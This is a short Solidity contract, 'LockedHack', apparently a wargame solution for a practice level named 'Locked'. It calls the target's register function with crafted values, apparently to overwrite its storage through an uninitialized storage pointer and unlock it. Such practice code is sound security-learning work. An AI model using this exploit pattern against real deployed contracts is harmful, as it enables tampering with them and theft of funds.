pragma solidity ^0.4.23;

import "./levels/Locked.sol";

contract LockedHack {

    function attack(address _target) public {
        Locked target = Locked(_target);

        bytes32 name = 0x01;
        address mappedAddress = 0x34;
        
        target.register(name, mappedAddress);
    }
}

